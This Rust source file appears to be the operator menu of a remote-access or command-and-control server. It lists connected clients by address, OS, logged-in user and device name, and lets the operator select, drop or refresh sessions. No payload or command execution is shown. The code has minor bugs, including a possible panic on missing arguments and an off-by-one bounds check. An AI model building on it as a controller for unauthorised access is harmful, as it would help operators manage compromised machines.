#[path = "core.rs"]
mod core;
use std::io::Write;
use std::{io, ops::Deref, process, thread, time};
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
    sync::Mutex,
};
use util;

fn read_user_input() -> Vec<String> {
    print!(">>> ");
    io::stdout().flush().unwrap();

    let mut input = String::new();

    io::stdin().read_line(&mut input).unwrap();

    let input = input
        .trim()
        .split(" ")
        .map(|x| x.to_string())
        .collect::<Vec<String>>();

    input
}

pub async fn main_menu(client_list: util::Clients) {
    loop {
        let command = read_user_input();
        let (command, args) = (&command[0], &command[1..]);

        match command.to_lowercase().as_str() {
            "" => continue,
            "help" => {
                println!("\nsessions - display connected sections\n");
            }
            "sessions" => {
                if client_list.lock().await.len() == 0 {
                    continue;
                }

                println!("");

                if args.len() == 0 {
                    for (index, client) in client_list.lock().await.deref().iter().enumerate() {
                        println!(
                            "\t[{}] {} | OS: {} | Current user: {} | Device name: {}",
                            index, client.peer_addr, client.os, client.username, client.device_name,
                        );
                    }
                } else {
                    let session = args.get(1).unwrap();

                    // Check if typed session is number
                    let session: usize = match session.parse() {
                        Ok(session) => session,
                        Err(_e) => {
                            println!("[-] Invalid session number [-]\n");
                            continue;
                        }
                    };

                    // Check if typed session is out of clients list range
                    if client_list.lock().await.len() < session {
                        println!("[-] Incorrect index [-]");
                        continue;
                    }

                    match args[0].to_lowercase().as_str() {
                        "i" => {
                            let mut client = client_list.lock().await.remove(session);

                            match session_menu(client).await {
                                Ok(changed_client) => client_list.lock().await.push(changed_client),
                                Err(_e) => _e,
                            }
                        }
                        "r" => {
                            let client = client_list.lock().await.remove(session);

                            println!(
                                "[!] {}/{} disconnected [!]",
                                client.peer_addr, client.username
                            );
                        }
                        _e => {}
                    }
                }

                println!("");

                continue;
            }
            // Checks the connection with all clients in the list,
            // remove the inactive ones
            "refresh" => {
                let mut remove_index: Vec<usize> = Vec::new();

                for (index, client) in client_list.lock().await.iter_mut().enumerate() {
                    match core::check_connection(client).await {
                        Ok(_e) => _e,
                        Err(_e) => {
                            println!(
                                "[!] {}/{} disconnected [!]",
                                client.peer_addr, client.username
                            );
                            remove_index.push(index);
                        }
                    }
                }

                let mut remove_times: usize = 0;

                for index in remove_index.iter() {
                    client_list.lock().await.remove(index - remove_times);
                    remove_times += 1;
                }
            }
            _ => {}
        }
    }
}

async fn session_menu(mut client: util::Client) -> Result<util::Client, ()> {
    match core::check_connection(&mut client).await {
        Ok(_e) => _e,
        Err(_) => {
            println!(
                "[!] {}/{} disconnected [!]",
                client.peer_addr, client.username
            );
            return Err(());
        }
    }

    Ok(client)
}
